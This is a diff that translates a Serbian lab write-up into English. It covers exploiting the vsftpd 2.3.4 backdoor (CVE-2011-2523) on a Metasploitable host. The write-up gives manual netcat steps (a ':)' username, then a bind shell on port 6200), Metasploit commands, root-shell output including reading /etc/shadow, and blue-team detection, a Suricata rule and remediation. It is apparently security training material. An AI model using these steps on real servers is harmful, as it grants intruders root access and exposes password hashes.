@@ -1,74 +1,73 @@
 # vsftpd 2.3.4 — Backdoor (CVE-2011-2523)
 
-Ova verzija vsftpd je bila kompromitovana negde između juna i jula 2011,
-kada je neko ubacio backdoor kod direktno u izvorne fajlove na download
-serveru projekta. Za razliku od Samba usermap_script bug-a, ovde ne
-eksploatišemo grešku u logici servisa — server je već "trovan" pre nego
-što je uopšte instaliran.
+This version of vsftpd got compromised somewhere around June–July 2011, when
+someone slipped backdoor code straight into the source files on the project's
+download server. This isn't a bug in how the service works. The server was
+poisoned before anyone even installed it.
 
-## Cilj
+## Target
 - IP: 192.168.56.102
-- Port: 21 (FTP), backdoor shell se otvara na portu 6200
-- Servis: vsftpd 2.3.4
+- Port: 21 (FTP); the backdoor shell opens on port 6200
+- Service: vsftpd 2.3.4
 
 ## CVE
 CVE-2011-2523
 
-## Tip napada
-Backdoor ubačen u izvorni kod (supply chain kompromitacija)
+## Attack type
+Backdoor planted in the source code (supply chain compromise)
 
 ## MITRE ATT&CK
 - T1190 – Exploit Public-Facing Application
 - T1059 – Command and Scripting Interpreter
 
-## Mehanizam
+## Mechanism
 
-Trik je u tome što ako username tokom FTP login-a sadrži karakter `:)`,
-backdoor kod se aktivira i servis otvara bind shell na portu 6200. Ne
-treba ni tačna lozinka — čim se konektuješ na taj port, dobijaš root.
+The whole trick: if the username you send during FTP login contains `:)`, the
+backdoor wakes up and the service opens a bind shell on port 6200. You don't even
+need a valid password. Connect to that port and you're root.
 
 ---
 
-## Metod 1: Ručna eksploatacija
+## Method 1: Manual exploitation
 
-### Korak 1: Trigeruj backdoor preko FTP konekcije
+### Step 1: Trigger the backdoor over FTP
 
 ```bash
 nc 192.168.56.102 21
 ```
 
-Kad se konekcija otvori, ukucaj:
+Once it connects, type:
 
 USER backdoor:)
-PASS bilokoja
+PASS anything
 
 
-Konekciju posle ovoga možeš prekinuti (Ctrl+C) — backdoor ostaje aktivan,
-port 6200 je sada otvoren.
+You can drop this connection afterwards (Ctrl+C). The backdoor stays up and port
+6200 is now open.
 
-### Korak 2: Poveži se na backdoor port
+### Step 2: Connect to the backdoor port
 
 ```bash
 nc 192.168.56.102 6200
 ```
 
-### Rezultat
+### Result
 
-![Ručna eksploatacija](screenshots/01_vsftpd_manual_root.png)
+![Manual exploitation](screenshots/01_vsftpd_manual_root.png)
 
-Odmah po konekciji dobija se root shell bez ikakve dodatne autentifikacije:
+The moment it connects you land in a root shell, no authentication of any kind:
 
 whoami → root
 id → uid=0(root) gid=0(root)
 uname -a → Linux metasploitable 2.6.24-16-server ...
-cat /etc/shadow | head -5 → hash-evi lozinki, vidljivi bez ograničenja
+cat /etc/shadow | head -5 → password hashes, right there with no restriction
 
 
 ---
 
-## Metod 2: Metasploit
+## Method 2: Metasploit
 
-### Komande
+### Commands
 
 ```bash
 msfconsole
@@ -78,41 +77,41 @@ set LHOST 192.168.56.101
 run
 ```
 
-### Rezultat
+### Result
 
-![Metasploit eksploatacija](screenshots/01_vsftpd_metasploit_root.png)
+![Metasploit exploitation](screenshots/01_vsftpd_metasploit_root.png)
 
-Metasploit modul radi identičnu stvar u pozadini, samo automatizovano —
-sam šalje `:)` payload i otvara sesiju:
+The module does the exact same thing under the hood, just automated. It sends the
+`:)` payload and opens the session for you:
 
 [+] Backdoor has been spawned!
 [*] Meterpreter session 1 opened
 meterpreter > getuid → Server username: root
 meterpreter > sysinfo → Metasploitable, Ubuntu 8.04, i686
 meterpreter > shell
-cat /etc/shadow → potvrda root pristupa
+cat /etc/shadow → confirms root access
 
 
 ---
 
-## Detekcija (blue team ugao)
+## Detection (blue-team view)
 
-Nekoliko stvari bi ovde trebalo da upali alarm kod pravog SOC tima:
-- Konekcija na port 6200 — nije standardan servis, nema razloga da bude otvoren
-- FTP login pokušaj sa čudnim karakterima u username polju
-- Shell proces koji se spawn-uje odmah nakon FTP konekcije, bez ikakve legitimne veze između ta dva događaja
-- Meterpreter/reverse shell saobraćaj ima prepoznatljiv TCP handshake obrazac ka nestandardnom portu
+A few things here should set off alarms for a real SOC team:
+- A connection to port 6200. It's not a standard service and has no business being open.
+- An FTP login with odd characters in the username field.
+- A shell process spawning right after an FTP connection, with nothing legitimate tying the two together.
+- Meterpreter / reverse shell traffic has a recognizable TCP handshake pattern toward a non-standard port.
 
-## IDS potpis (Suricata primer)
+## IDS signature (Suricata example)
 
 alert tcp any any -> any 6200 (msg:"vsftpd 2.3.4 backdoor shell connection"; sid:9000001;)
 
 
-## Remedijacija
-- Ne koristiti vsftpd 2.3.4 pod nikakvim uslovima — upgrade na aktuelnu verziju
-- Proveravati integritet paketa pre instalacije (checksum, potpisani repo)
-- Firewall pravilo koje blokira nestandardne portove poput 6200
-- Redovan monitoring neočekivano otvorenih portova na produkcionim serverima
+## Remediation
+- Don't run vsftpd 2.3.4, full stop. Upgrade to a current version.
+- Verify package integrity before installing (checksums, signed repos).
+- A firewall rule that blocks odd ports like 6200.
+- Keep an eye on production servers for ports that open up unexpectedly.
 
 ## Screenshots
 - `01_vsftpd_manual_root.png`
